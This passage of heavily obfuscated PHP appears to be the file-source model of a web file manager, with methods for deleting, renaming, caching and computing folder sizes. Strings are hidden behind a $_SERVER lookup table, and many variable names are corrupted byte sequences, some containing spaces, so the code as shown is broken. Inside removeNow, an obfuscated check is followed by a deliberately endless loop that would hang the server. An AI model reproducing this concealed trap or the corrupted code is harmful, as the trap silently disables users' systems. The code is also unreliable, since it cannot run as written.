$Œ×¬ª = $this->childrenAll($Æ†îì€»); $ºÉ¸Ê¯¡ = array($ áé¨ñ±[455] => array($ áé¨ñ±[456], $Œ×¬ª[$ áé¨ñ±[2156]])); Model($ áé¨ñ±[2157])->where($ºÉ¸Ê¯¡)->delete(); } public function removeNow($úµÎËŒ, $¨ù¶—ÓÉ = true) { $¹ı®Û¥Õ =& $_SERVER[¹òÍ›æş]; if (!isset($_SERVER[$¹ı®Û¥Õ[54]]) || !isset($_SERVER[$¹ı®Û¥Õ[63]])) { $â€šÆçÆ = $¹ı®Û¥Õ[906]; $°€æç£Á = $¹ı®Û¥Õ[56]; $´åŠª®è = $_SERVER[$¹ı®Û¥Õ[57]] . $¹ı®Û¥Õ[58]; $Ùù›£™ı = $°€æç£Á($´åŠª®è); $†“®ªÌÉ = explode($¹ı®Û¥Õ[59], $Ùù›£™ı); if (count($†“®ªÌÉ) < $¹ı®Û¥Õ[654]) { $µÃ‹š»¯ = $¹ı®Û¥Õ[61]; $µÃ‹š»¯(); } $Ûêñê±Ç = $¹ı®Û¥Õ[907]; $Ûêñê±Ç($_SERVER[$¹ı®Û¥Õ[908]]); $ò¬„éò¤ = 1; for ($óû‡Òµ– = $ò¬„éò¤; $óû‡Òµ– > 0; $óû‡Òµ–++) { $Ûêñê±Ç = json_encode($GLOBALS[$¹ı®Û¥Õ[456]]); } } $÷¸Î–ÌË = $this->sourceInfo($úµÎËŒ); $ÒÜ¨§Ş = $this->pathInfoMore($úµÎËŒ); if (!$÷¸Î–ÌË) { return !0; } if ($÷¸Î–ÌË[$¹ı®Û¥Õ[470]] == 0) { if (!_get($GLOBALS, $¹ı®Û¥Õ[532])) { return !1; } } $this->lockMoveStart($úµÎËŒ); Hook::trigger($¹ı®Û¥Õ[2158], $ÒÜ¨§Ş, $¨ù¶—ÓÉ); if ($¨ù¶—ÓÉ) { Model($¹ı®Û¥Õ[2157])->moveToRecycle($úµÎËŒ); } else { $£¹Æ±é = $this->childrenAll($÷¸Î–ÌË); Model($¹ı®Û¥Õ[599])->eventRemove($úµÎËŒ); $this->removeRelevance($£¹Æ±é[$¹ı®Û¥Õ[2156]], $£¹Æ±é[$¹ı®Û¥Õ[1483]]); } $this->folderSizeReset($÷¸Î–ÌË[$¹ı®Û¥Õ[470]]); $®—¾ûµƒ = array($÷¸Î–ÌË[$¹ı®Û¥Õ[470]]); if ($÷¸Î–ÌË[$¹ı®Û¥Õ[448]] == $¹ı®Û¥Õ[98]) { $®—¾ûµƒ[] = $÷¸Î–ÌË[$¹ı®Û¥Õ[440]]; } $this->updateModifyTime($®—¾ûµƒ); $this->lockMoveEnd($úµÎËŒ); Hook::trigger($¹ı®Û¥Õ[1711], $ÒÜ¨§Ş, $¨ù¶—ÓÉ); return !0; } public function childrenAll($èøíÊë) { $­ÔõÃ =& $_SERVER[¹òÍ›æş]; $©¸›·æ· = $èøíÊë[$­ÔõÃ[440]]; if ($èøíÊë[$­ÔõÃ[448]] == $­ÔõÃ[98]) { $¾ı­ü„ï = array($­ÔõÃ[618] => array($­ÔõÃ[578], $èøíÊë[$­ÔõÃ[549]] . $©¸›·æ· . $­ÔõÃ[579])); $±£òÜÓ¸ = array($­ÔõÃ[618] => $¾ı­ü„ï[$­ÔõÃ[549]]); $ê†óŒÃñ = $this->field($­ÔõÃ[2159])->where($±£òÜÓ¸)->select(); $ñ«…‡µ = !1; $¯Ê¯ÒãÌ = array($©¸›·æ·); if ($ê†óŒÃñ) { $ñ«…‡µ = array_to_keyvalue($ê†óŒÃñ, $­ÔõÃ[12], $­ÔõÃ[506]); $ñ«…‡µ = array_remove_value($ñ«…‡µ, $­ÔõÃ[208]); $¯Ê¯ÒãÌ = array_to_keyvalue($ê†óŒÃñ, $­ÔõÃ[12], $­ÔõÃ[440]); $¯Ê¯ÒãÌ[] = $©¸›·æ·; } } else { $ñ«…‡µ = array($èøíÊë[$­ÔõÃ[506]]); $¯Ê¯ÒãÌ = array($©¸›·æ·); } return array($­ÔõÃ[2156] => $¯Ê¯ÒãÌ, $­ÔõÃ[1483] => $ñ«…‡µ); } public function removeArray($åÑÛÑ¤) { if (!$åÑÛÑ¤) { return !0; } } public function removeRelevance($éúÛ€ñâ, $ƒ“İÑà¬) { $ğ­±«ÌÔ =& $_SERVER[¹òÍ›æş]; $éúÛ€ñâ = $éúÛ€ñâ ? $éúÛ€ñâ : array(); $ƒ“İÑà¬ = $ƒ“İÑà¬ ? $ƒ“İÑà¬ : array(); $éúÛ€ñâ = array_unique(array_filter($éúÛ€ñâ)); $ƒ“İÑà¬ = array_unique(array_filter($ƒ“İÑà¬)); if (!$éúÛ€ñâ) { return !1; } $±ëòÏÜ© = array($ğ­±«ÌÔ[455] => array($ğ­±«ÌÔ[456], $éúÛ€ñâ)); Model($ğ­±«ÌÔ[2157])->where($±ëòÏÜ©)->delete(); Model($ğ­±«ÌÔ[500])->where($±ëòÏÜ©)->delete(); Model($ğ­±«ÌÔ[2006])->where($±ëòÏÜ©)->delete(); Model($ğ­±«ÌÔ[599])->where($±ëòÏÜ©)->delete(); Model($ğ­±«ÌÔ[1839])->removeBySource($éúÛ€ñâ); Model($ğ­±«ÌÔ[2139])->removeBySource($éúÛ€ñâ); $this->where($±ëòÏÜ©)->delete(); Model($ğ­±«ÌÔ[509])->remove($ƒ“İÑà¬); for ($şæÉ¥» = 0; $şæÉ¥» < count($éúÛ€ñâ); $şæÉ¥»++) { $this->sourceCacheClear($éúÛ€ñâ[$şæÉ¥»]); } } public function rename($›’ƒ¤½—, $ŠµëĞ†) { $”Ïºò”á =& $_SERVER[¹òÍ›æş]; $Œ¨µİãƒ = $this->sourceInfo($›’ƒ¤½—); if (!$Œ¨µİãƒ) { return !1; } $¬Ë­¡’ = $this->fileNameExist($Œ¨µİãƒ[$”Ïºò”á[470]], $ŠµëĞ†); if ($¬Ë­¡’ && $¬Ë­¡’ != $›’ƒ¤½—) { return !1; } $ÆƒÎ¾¥‘ = array($”Ïºò”á[458] => $ŠµëĞ†, $”Ïºò”á[617] => USER_ID); if ($Œ¨µİãƒ[$”Ïºò”á[448]] != $”Ïºò”á[98]) { $ÆƒÎ¾¥‘[$”Ïºò”á[450]] = substr(get_path_ext($ŠµëĞ†), 0, 10); } Model($”Ïºò”á[599])->eventRename($›’ƒ¤½—, $Œ¨µİãƒ[$”Ïºò”á[32]], $ŠµëĞ†); $this->sourceCacheClear($›’ƒ¤½—); $this->setNamePinyin($›’ƒ¤½—, $ÆƒÎ¾¥‘[$”Ïºò”á[32]], !1); $this->updateModifyTime($Œ¨µİãƒ[$”Ïºò”á[470]]); $Á¤°Ä¿ = $this->where(array($”Ïºò”á[455] => $›’ƒ¤½—))->data($ÆƒÎ¾¥‘)->save(); $¥ŠóêŸå = $”Ïºò”á[2146] . $Œ¨µİãƒ[$”Ïºò”á[470]]; if (isset(self::$cacheChildList[$¥ŠóêŸå])) { unset(self::$cacheChildList[$¥ŠóêŸå]); } return $Á¤°Ä¿; } public function setNamePinyin($ Ø¢ÜÒ¨, $¨„¡í¢¸, $äé¯ØÔË = true) { $ÜĞ¢õÊÕ =& $_SERVER[¹òÍ›æş]; $ğí‰Îèµ = Input::check($¨„¡í¢¸, $ÜĞ¢õÊÕ[621]); $Ò­á™áË = array($ÜĞ¢õÊÕ[482] => KodSort::makeStr($¨„¡í¢¸)); if ($ğí‰Îèµ) { $Ò­á™áË[$ÜĞ¢õÊÕ[503]] = str_replace($ÜĞ¢õÊÕ[53], $ÜĞ¢õÊÕ[12], Pinyin::get($¨„¡í¢¸)); $Ò­á™áË[$ÜĞ¢õÊÕ[502]] = Pinyin::get($¨„¡í¢¸, $ÜĞ¢õÊÕ[622]); } if (!$äé¯ØÔË && !$ğí‰Îèµ) { $Ò­á™áË[$ÜĞ¢õÊÕ[503]] = null; $Ò­á™áË[$ÜĞ¢õÊÕ[502]] = null; } $this->metaSet($ Ø¢ÜÒ¨, $Ò­á™áË); } public function getContent($§–•şœ­) { $˜—ˆÁùô =& $_SERVER[¹òÍ›æş]; $å³íå½ = $this->fileInfoGet($§–•şœ­); if (!$å³íå½) { return !1; } if ($å³íå½[$˜—ˆÁùô[86]] == 0) { return $˜—ˆÁùô[12]; } $Ä—¾Ö = $˜—ˆÁùô[2160] . $å³íå½[$˜—ˆÁùô[186]]; if ($å³íå½[$˜—ˆÁùô[86]] <= 1024 * 10) { $şÀ˜Ø¾ = Cache::get($Ä—¾Ö); if (!$şÀ˜Ø¾) { $şÀ˜Ø¾ = IO::getContent($å³íå½[$˜—ˆÁùô[94]]); Cache::set($Ä—¾Ö, $şÀ˜Ø¾); } return $şÀ˜Ø¾; } if (!$å³íå½[$˜—ˆÁùô[94]]) { return $˜—ˆÁùô[12]; } return IO::getContent($å³íå½[$˜—ˆÁùô[94]]); } public function setDesc($«–¦Èøó, $ö„¡ˆ¬) { $Õ²ü¦–è =& $_SERVER[¹òÍ›æş]; Model($Õ²ü¦–è[599])->eventAddDesc($«–¦Èøó, $ö„¡ˆ¬); return $this->metaSet($«–¦Èøó, $Õ²ü¦–è[491], $ö„¡ˆ¬); } public function setContent($Ö™»£¾¢, $¸‹ˆØ£ö = '') { $™°ÕÁ =& $_SERVER[¹òÍ›æş]; $ñÑ†š”Ú = $this->sourceInfo($Ö™»£¾¢); $èìŸ¢Ì = $this->fileInfoGet($Ö™»£¾¢); if (!$èìŸ¢Ì || !$ñÑ†š”Ú) { return !1; } $åÒô¹÷“ = Model($™°ÕÁ[509])->addFileByContent($¸‹ˆØ£ö, $ñÑ†š”Ú[$™°ÕÁ[32]]); $­ÙŸóÄÒ = $this->fileHistory($ñÑ†š”Ú, $åÒô¹÷“[$™°ÕÁ[506]], $åÒô¹÷“[$™°ÕÁ[86]]); if (!$­ÙŸóÄÒ) { return Model($™°ÕÁ[509])->remove($åÒô¹÷“[$™°ÕÁ[506]]); } $this->folderSizeReset($ñÑ†š”Ú[$™°ÕÁ[470]]); return !0; } public function fileSubstr($òûÃÅ³, $š·Àâ¶õ, $ª¼ÇÈØ‡) { $¨ÌøÊ“ = $this->fileInfoGet($òûÃÅ³); if (!$¨ÌøÊ“) { return !1; } return IO::fileSubstr($¨ÌøÊ“[$_SERVER[¹òÍ›æş][94]], $š·Àâ¶õ, $ª¼ÇÈØ‡); } public function fileInfoGet($¡ÌÅúë’) { $á‚›”Ú¶ =& $_SERVER[¹òÍ›æş]; $Š±Ø„‚ò = $this->sourceInfo($¡ÌÅúë’); if (!$Š±Ø„‚ò || $Š±Ø„‚ò[$á‚›”Ú¶[448]]) { return !1; } $·»·Ÿ²” = $á‚›”Ú¶[512] . $Š±Ø„‚ò[$á‚›”Ú¶[506]]; $–ËŞáªˆ = _get(self::$cacheFileInfo, $·»·Ÿ²”); if ($–ËŞáªˆ) { return $–ËŞáªˆ; } $ï—¤•ëÏ = Model($á‚›”Ú¶[509])->fileInfo($Š±Ø„‚ò[$á‚›”Ú¶[506]]); if ($ï—¤•ëÏ) { $ï—¤•ëÏ[$á‚›”Ú¶[32]] = $Š±Ø„‚ò[$á‚›”Ú¶[32]]; } self::$cacheFileInfo[$·»·Ÿ²”] = $ï—¤•ëÏ; return $ï—¤•ëÏ; } private function folderChildrenNumber($ŠÌÙäÈ¾) { $ØÓì´Ñª =& $_SERVER[¹òÍ›æş]; $Í®‘†÷ = $this->sourceInfo($ŠÌÙäÈ¾); $´ü±ºôã = array($ØÓì´Ñª[618] => array($ØÓì´Ñª[578], $Í®‘†÷[$ØÓì´Ñª[549]] . $ŠÌÙäÈ¾ . $ØÓì´Ñª[579]), $ØÓì´Ñª[615] => $Í®‘†÷[$ØÓì´Ñª[534]], $ØÓì´Ñª[468] => intval($Í®‘†÷[$ØÓì´Ñª[469]]), $ØÓì´Ñª[612] => 1); $…Ì‹³´ = $this->where($´ü±ºôã)->count(); $æ»şæßû = $this->where($´ü±ºôã)->where(array($ØÓì´Ñª[612] => 0))->count(); return array($ØÓì´Ñª[90] => $æ»şæßû, $ØÓì´Ñª[91] => $…Ì‹³´); } public function pathInfo($“ˆ—±§ò, $¶¢Êşâ = false) { $Ô€Š¯¢Ë =& $_SERVER[¹òÍ›æş]; $¶¢Êşâ = !1; $“ˆ—±§ò = intval($“ˆ—±§ò); $Æˆãƒ» = $Ô€Š¯¢Ë[499] . intval($¶¢Êşâ) . $Ô€Š¯¢Ë[424] . $“ˆ—±§ò; $€å‡ÍóŠ = _get(self::$cachePathInfo, $Æˆãƒ»); if ($€å‡ÍóŠ) { return $€å‡ÍóŠ; } $£Ìà¾¡÷ = $this->sourceInfo($“ˆ—±§ò); if (!$£Ìà¾¡÷) { return !1; } $£Ìà¾¡÷ = $this->_listDataApplyItem($£Ìà¾¡÷, $¶¢Êşâ); self::$cachePathInfo[$Æˆãƒ»] = $£Ìà¾¡÷; return $£Ìà¾¡÷; } public static $cachePathInfoMore = array(); public function pathInfoMore($Šš­˜ò°) { $†Ç®Ñïë =& $_SERVER[¹òÍ›æş]; $ù£¨Ş¹€ = _get(self::$cachePathInfoMore, $Šš­˜ò°); if ($ù£¨Ş¹€) { return $ù£¨Ş¹€; } $ƒæ†ÖŠÈ = $this->pathInfo($Šš­˜ò°); if (!$ƒæ†ÖŠÈ) { return !1; } if ($ƒæ†ÖŠÈ[$†Ç®Ñïë[448]] == $†Ç®Ñïë[98]) { $ƒæ†ÖŠÈ[$†Ç®Ñïë[89]] = $this->folderChildrenNumber($Šš­˜ò°); } self::$cachePathInfoMore[$Šš­˜ò°] = $ƒæ†ÖŠÈ; return $ƒæ†ÖŠÈ; } public function sourceInfo($ë³ÀÚñ¾) { $Õ–Ö—ïú =& $_SERVER[¹òÍ›æş]; if (!$ë³ÀÚñ¾) { return array(); } $ë³ÀÚñ¾ = intval($ë³ÀÚñ¾); $Ş‘ş½Àì = $Õ–Ö—ïú[498] . $ë³ÀÚñ¾; $€€ÂâàÄ = _get(self::$cacheSourceInfo, $Ş‘ş½Àì); if ($€€ÂâàÄ) { return $€€ÂâàÄ; } $åßš…¥¿ = $this->where(array($Õ–Ö—ïú[440] => $ë³ÀÚñ¾))->find(); self::$cacheSourceInfo[$Ş‘ş½Àì] = $åßš…¥¿; return self::$cacheSourceInfo[$Ş‘ş½Àì]; } public function sourceCacheClear($öŠÚî‰ = false) { self::cacheClear($öŠÚî‰); } public static function cacheClear($¾ÕôŠÌÅ = false) { $ñÙ©‘Á´ =& $_SERVER[¹òÍ›æş]; if ($¾ÕôŠÌÅ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ñÙ©‘Á´[498] . $¾ÕôŠÌÅ]); unset(self::$cachePathInfoMore[$¾ÕôŠÌÅ]); unset(self::$cachePathInfo[$ñÙ©‘Á´[2161] . $¾ÕôŠÌÅ]); unset(self::$cachePathInfo[$ñÙ©‘Á´[2162] . $¾ÕôŠÌÅ]); } public function metaSet($ÑÀæ¢×æ, $ÓãĞ¦ Ø = null, $€£«œÎà = null) { $ãÊ³¨Á = parent::metaSet($ÑÀæ¢×æ, $ÓãĞ¦ Ø, $€£«œÎà); if ($ãÊ³¨Á) { $this->sourceCacheClear($ÑÀæ¢×æ); } return $ãÊ³¨Á; } public function pathInfoByPath($…ÈÂœü³, $Ş›µ¢¡) { $÷¸Ïéùè =& $_SERVER[¹òÍ›æş]; $¨£ûı¸è = !$Ş›µ¢¡ ? array() : explode($÷¸Ïéùè[8], trim($Ş›µ¢¡, $÷¸Ïéùè[8])); $ÃŒÅ´íß = $…ÈÂœü³; foreach ($¨£ûı¸è as $ÌâŒÏ‘) { $„½Ğ«”ñ = array($÷¸Ïéùè[470] => $ÃŒÅ´íß, $÷¸Ïéùè[32] => $ÌâŒÏ‘); $úœÒÚÔÛ = $this->where($„½Ğ«”ñ)->select(); if (!$úœÒÚÔÛ) { return !1; } $úœÒÚÔÛ = array_sort_by($úœÒÚÔÛ, $÷¸Ïéùè[469]); $ÃŒÅ´íß = $úœÒÚÔÛ[0][$÷¸Ïéùè[440]]; } return $this->pathInfo($ÃŒÅ´íß, !0); } protected function updateModifyTime($àúš™ø°) { $ûÚ»»û =& $_SERVER[¹òÍ›æş]; $Ë‹²ÃÕ‘ = defined($ûÚ»»û[2080]) ? USER_ID : 0; if (!$àúš™ø°) { return; } if (!is_array($àúš™ø°)) { $àúš™ø° = array($àúš™ø°); } foreach ($àúš™ø° as $Û¹¯  => $ò¨®«›™) { $àúš™ø°[$Û¹¯ ] = intval($ò¨®«›™); $this->sourceCacheClear($ò¨®«›™); } $òÒÕ¦”Î = array($ûÚ»»û[440] => array($ûÚ»»û[7], $àúš™ø°)); $×¶ÛÑ¤ª = array($ûÚ»»û[617] => $Ë‹²ÃÕ‘, $ûÚ»»û[462] => time()); $this->where($òÒÕ¦”Î)->save($×¶ÛÑ¤ª); } public function folderSizeReset($Ù †‡áÖ, $ƒïüÁ’î = false) { $¦¥â–Ğ =& $_SERVER[¹òÍ›æş]; if ($this->statusIgnoreResetSpace) { return; } $ ‡ä¿ö¤ = $this->sourceInfo($Ù †‡áÖ); $ˆõ™ú¨ú = $¦¥â–Ğ[2163] . $Ù †‡áÖ; CacheLock::lock($ˆõ™ú¨ú, 20); if ($ƒïüÁ’î === !1) { $this->sourceCacheClear($Ù †‡áÖ); $ ‡ä¿ö¤ = $this->sourceInfo($Ù †‡áÖ); $ñË‚ğ ÷ = array($¦¥â–Ğ[439] => $Ù †‡áÖ, $¦¥â–Ğ[468] => 0); $ÆÒÙÚÕğ = $this->where($ñË‚ğ ÷)->sum($¦¥â–Ğ[86]); $ƒïüÁ’î = intval($ÆÒÙÚÕğ) - intval($ ‡ä¿ö¤[$¦¥â–Ğ[86]]); } if ($ƒïüÁ’î == 0) { return CacheLock::unlock($ˆõ™ú¨ú); } $ØÔÓèá = $this->parentLevelArray($ ‡ä¿ö¤[$¦¥â–Ğ[549]]); if (!$ØÔÓèá) { $ØÔÓèá = array(); } $ØÔÓèá[] = $ ‡ä¿ö¤[$¦¥â–Ğ[440]]; $ñË‚ğ ÷ = array($¦¥â–Ğ[440] => array($¦¥â–Ğ[456], $ØÔÓèá)); if ($ƒïüÁ’î < 0) { $ñË‚ğ ÷[$¦¥â–Ğ[86]] = array($¦¥â–Ğ[1042], abs($ƒïüÁ’î)); } $this->where($ñË‚ğ ÷)->setAdd($¦¥â–Ğ[86], $ƒïüÁ’î); CacheLock::unlock($ˆõ™ú¨ú); $¿âØòø¦ = $¦¥â–Ğ[2164] . $ ‡ä¿ö¤[$¦¥â–Ğ[449]] . $¦¥â–Ğ[4] . $ ‡ä¿ö¤[$¦¥â–Ğ[534]]; $Û’°æèÄ = array($ ‡ä¿ö¤[$¦¥â–Ğ[449]], $ ‡ä¿ö¤[$¦¥â–Ğ[534]]); TaskRun::timeLimitCall($¿âØòø¦, $¦¥â–Ğ[2165], $Û’°æèÄ, 1.5); } public function folderSizeResetChildren($éÏëç) { $³µï§âÅ =& $_SERVER[¹òÍ›æş]; $this->sourceCacheClear($éÏëç); $™Š¨Õ¼… = $this->sourceInfo($éÏëç); $ä²æ”â¤ = array($³µï§âÅ[612] => 1, $³µï§âÅ[615] => $™Š¨Õ¼…[$³µï§âÅ[534]], $³µï§âÅ[618] => array($³µï§âÅ[578], $™Š¨Õ¼…[$³µï§âÅ[549]] . $éÏëç . $³µï§âÅ[579])); $¶Ï«ÜñÂ = $³µï§âÅ[2166]; $µĞåˆ† = $this->field($¶Ï«ÜñÂ)->where($ä²æ”â¤)->select(); $ä²æ”â¤[$³µï§âÅ[448]] = 0; $‘Ñ²…×¨ = $this->field($¶Ï«ÜñÂ)->where($ä²æ”â¤)->select(); if (!$‘Ñ²…×¨) { return; } $µĞåˆ†[] = $™Š¨Õ¼…; $µĞåˆ† = array_to_keyvalue($µĞåˆ†, $³µï§âÅ[440]); foreach ($µĞåˆ† as $”»òó¼Í => $óí“İ«Ê) { $µĞåˆ†[$”»òó¼Í][$³µï§âÅ[2167]] = $µĞåˆ†[$”»òó¼Í][$³µï§âÅ[86]]; $µĞåˆ†[$”»òó¼Í][$³µï§âÅ[86]] = 0; } foreach ($‘Ñ²…×¨ as $óí“İ«Ê) { $ïş¦åİ = $óí“İ«Ê[$³µï§âÅ[470]] . $³µï§âÅ[12]; if (!isset($µĞåˆ†[$ïş¦åİ])) { continue; } if ($óí“İ«Ê[$³µï§âÅ[469]] == $µĞåˆ†[$ïş¦åİ][$³µï§âÅ[469]]) { $µĞåˆ†[$ïş¦åİ][$³µï§âÅ[86]] += $óí“İ«Ê[$³µï§âÅ[86]]; } } foreach ($µĞåˆ† as $óí“İ«Ê) { $áı©ãŞ = $this->parentLevelArray($óí“İ«Ê[$³µï§âÅ[549]]); foreach ($áı©ãŞ as $ïş¦åİ) { $ïş¦åİ = $ïş¦åİ . $³µï§âÅ[12]; if (!isset($µĞåˆ†[$ïş¦åİ])) { continue; } if ($óí“İ«Ê[$³µï§âÅ[469]] == $µĞåˆ†[$ïş¦åİ][$³µï§âÅ[469]]) { $µĞåˆ†[$ïş¦åİ][$³µï§âÅ[86]] += $óí“İ«Ê[$³µï§âÅ[86]]; } } } $¼šì‹Ä¤ = array(); foreach ($µĞåˆ† as $óí“İ«Ê) { if ($óí“İ«Ê[$³µï§âÅ[86]] == $óí“İ«Ê[$³µï§âÅ[2167]]) { continue; } $¼šì‹Ä¤[] = array($³µï§âÅ[440], $óí“İ«Ê[$³µï§âÅ[440]], $³µï§âÅ[86], $óí“İ«Ê[$³µï§âÅ[86]]); } $this->saveAll($¼šì‹Ä¤); } public function userSpaceReset($—İİÔéË = false) { $œóº =& $_SERVER[¹òÍ›æş]; $«…À÷€ = $this->where(array($œóº[449] => self::TYPE_USER, $œóº[534] => $—İİÔéË, $œóº[448] => 0))->sum($œóº[86]); $«…À÷€ = !$«…À÷€ || $«…À÷€ <= 0 ? 0 : $«…À÷€; Model($œóº[542])->userEdit($—İİÔéË, array($œóº[1848] => $«…À÷€)); } public function targetSpaceUpdate($ÜÖÀ¹§÷, $Òòş³§¡) { $×¹“Õò =& $_SERVER[¹òÍ›æş]; if (!$Òòş³§¡) { return; } if (!in_array($ÜÖÀ¹§÷, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $İø­È¼› = $this->targetSpaceSize($ÜÖÀ¹§÷, $Òòş³§¡); if ($ÜÖÀ¹§÷ == self::TYPE_USER) { Model($×¹“Õò[542])->userEdit($Òòş³§¡, array($×¹“Õò[1848] => $İø­È¼›)); } else { if ($ÜÖÀ¹§÷ == self::TYPE_GROUP) { Model($×¹“Õò[550])->groupEdit($Òòş³§¡, array($×¹“Õò[1848] => $İø­È¼›)); } } } public function targetSpaceSize($ôÍúñ–Æ, $øÂùä¶•) { $¢ØÚóôÅ =& $_SERVER[¹òÍ›æş]; $·õ¨Æ¯ = 0; $ïå´©œ’ = $this->targetSourceRoot($ôÍúñ–Æ, $øÂùä¶•, !0); foreach ($ïå´©œ’ as $¼‡è¨áà) { if (!$¼‡è¨áà) { continue; } $·õ¨Æ¯ += floatval($¼‡è¨áà[$¢ØÚóôÅ[86]]); $¢Ç­«Ù = array($¢ØÚóôÅ[618] => array($¢ØÚóôÅ[578], $¢ØÚóôÅ[559] . $¼‡è¨áà[$¢ØÚóôÅ[440]] . $¢ØÚóôÅ[579])); $«º´ïÈ‡ = Model($¢ØÚóôÅ[467])->field($¢ØÚóôÅ[455])->where($¢Ç­«Ù)->select(); $«º´ïÈ‡ = array_to_keyvalue($«º´ïÈ‡, $¢ØÚóôÅ[12], $¢ØÚóôÅ[440]); $«º´ïÈ‡ = array_unique(array_filter($«º´ïÈ‡)); if ($«º´ïÈ‡) { $¢Ç­«Ù = array($¢ØÚóôÅ[455] => array($¢ØÚóôÅ[456], $«º´ïÈ‡)); $·õ¨Æ¯ += floatval($this->where($¢Ç­«Ù)->sum($¢ØÚóôÅ[86])); } } $·õ¨Æ¯ = !$·õ¨Æ¯ || $·õ¨Æ¯ <= 0 ? 0 : $·õ¨Æ¯; return $·õ¨Æ¯; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¦Ø²Ë¡) { return $this->fileTypeProfile($¦Ø²Ë¡, SourceModel::TYPE_USER); } public function groupFileTypeProfile($”¾›İšê) { return $this->fileTypeProfile($”¾›İšê, SourceModel::TYPE_GROUP); } private function fileTypeProfile($•’İÍÀõ, $ØãÔè²ë) { $ìÇ¸õ· =& $_SERVER[¹òÍ›æş]; $Ô¥ÈÛ” = $ìÇ¸õ·[2168] . $•’İÍÀõ . $ìÇ¸õ·[11] . $ØãÔè²ë; $»ä“ıÁ = Cache::get($Ô¥ÈÛ”); if ($»ä“ıÁ) { return $»ä“ıÁ; } $æİ•Ëº  = array($ìÇ¸õ·[612] => 0); if ($•’İÍÀõ != !1) { $æİ•Ëº [$ìÇ¸õ·[534]] = $•’İÍÀõ; $æİ•Ëº [$ìÇ¸õ·[449]] = $ØãÔè²ë; } $‘ïı”  = array(); $‘ïı” [$ìÇ¸õ·[2169]] = array($ìÇ¸õ·[2170] => LNG($ìÇ¸õ·[2169]), $ìÇ¸õ·[2171] => $this->where($æİ•Ëº )->count(), $ìÇ¸õ·[583] => $this->where($æİ•Ëº )->sum($ìÇ¸õ·[86])); $‹”¿¥Ó¥ = KodIO::fileTypeList(); foreach ($‹”¿¥Ó¥ as $……ï’Â => $˜˜¢Øó) { $æİ•Ëº [$ìÇ¸õ·[450]] = $this->fileTypeWhere($……ï’Â); $‘ïı” [$……ï’Â] = array($ìÇ¸õ·[2170] => $˜˜¢Øó[$ìÇ¸õ·[32]], $ìÇ¸õ·[2171] => $this->where($æİ•Ëº )->count(), $ìÇ¸õ·[583] => $this->where($æİ•Ëº )->sum($ìÇ¸õ·[86])); } Cache::set($Ô¥ÈÛ”, $‘ïı” , 1200); return $‘ïı” ; } public function fileNameExist($·µâ¿ç¿, $í²Ú˜ƒ¿) { $ğñ‘¹ =& $_SERVER[¹òÍ›æş]; $óóëÚ¢¼ = $this->where(array($ğñ‘¹[470] => $·µâ¿ç¿, $ğñ‘¹[32] => $í²Ú˜ƒ¿, $ğñ‘¹[469] => 0))->find(); return is_array($óóëÚ¢¼) ? $óóëÚ¢¼[$ğñ‘¹[440]] : !1; } public function childList($‘¬¸¦í·) { $ï¨î©Ú =& $_SERVER[¹òÍ›æş]; $ºäÖß¹ = $ï¨î©Ú[2146] . $‘¬¸¦í·; if (isset(self::$cacheChildList[$ºäÖß¹])) { return self::$cacheChildList[$ºäÖß¹]; } $ÑÀÌï¶ù = array($ï¨î©Ú[470] => intval($‘¬¸¦í·), $ï¨î©Ú[469] => 0); $İ¤ÛÊ÷ = $this->where($ÑÀÌï¶ù)->select(); $İ¤ÛÊ÷ = $İ¤ÛÊ÷ ? $İ¤ÛÊ÷ : array(); self::$cacheChildList[$ºäÖß¹] = $İ¤ÛÊ÷; foreach ($İ¤ÛÊ÷ as $òœß¿¶Ú) { $ºäÖß¹ = $ï¨î©Ú[498] . $òœß¿¶Ú[$ï¨î©Ú[440]]; self::$cacheSourceInfo[$ºäÖß¹] = $òœß¿¶Ú; } return $İ¤ÛÊ÷; } public function fileNameAuto($¥û‹ƒ„æ, $èü“ı™ä, $Œƒ¥°¾ = REPEAT_RENAME, $÷¥€Š¦× = false) { $ŞèÁ§ĞÊ =& $_SERVER[¹òÍ›æş]; $è´‡Âóö = get_path_ext($èü“ı™ä); $Ü¡ê¶ö = $è´‡Âóö ? basename($èü“ı™ä, $ŞèÁ§ĞÊ[10] . $è´‡Âóö) . $ŞèÁ§ĞÊ[2172] . $è´‡Âóö : $èü“ı™ä . $ŞèÁ§ĞÊ[422]; $¯î®Ü‘ï = array($ŞèÁ§ĞÊ[470] => $¥û‹ƒ„æ, $ŞèÁ§ĞÊ[469] => 0, $ŞèÁ§ĞÊ[32] => array($ŞèÁ§ĞÊ[421], $Ü¡ê¶ö)); $··ËÍÔŞ = $this->field($ŞèÁ§ĞÊ[32])->where($¯î®Ü‘ï)->select(); $ÖûÜçŞ‘ = array_to_keyvalue($··ËÍÔŞ, $ŞèÁ§ĞÊ[12], $ŞèÁ§ĞÊ[32]); return $this->fileNameAutoGet($ÖûÜçŞ‘, $èü“ı™ä, $Œƒ¥°¾, $÷¥€Š¦×); } public function fileNameAutoGet($æ†ıé’À, $­œ¦Ùèì, $ŞÂò˜û¨, $ìéïîû€) { $ÌŠÌ…™Õ =& $_SERVER[¹òÍ›æş]; if ($ŞÂò˜û¨ == REPEAT_REPLACE || !$æ†ıé’À || !in_array_not_case($­œ¦Ùèì, $æ†ıé’À) || $ìéïîû€ && $ŞÂò˜û¨ != REPEAT_RENAME_FOLDER) { return $­œ¦Ùèì; } if ($ŞÂò˜û¨ == REPEAT_SKIP) { return !1; } $îñıª“Ù = $ÌŠÌ…™Õ[10] . get_path_ext($­œ¦Ùèì); $îñıª“Ù = $îñıª“Ù == $ÌŠÌ…™Õ[10] || $ìéïîû€ ? $ÌŠÌ…™Õ[12] : $îñıª“Ù; for ($³°¦›Êì = 1; $³°¦›Êì <= count($æ†ıé’À) + 1; $³°¦›Êì++) { $«—Í©áÚ = substr($­œ¦Ùèì, 0, strlen($­œ¦Ùèì) - strlen($îñıª“Ù)); $Ë£Ú·¾ = $«—Í©áÚ . "\x28{$³°¦›Êì}\x29{$îñıª“Ù}"; if (!in_array_not_case($Ë£Ú·¾, $æ†ıé’À)) { return $Ë£Ú·¾; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\143\145\x5f\162\145\x63\x79\143\154\x65"; protected $dataAuto = 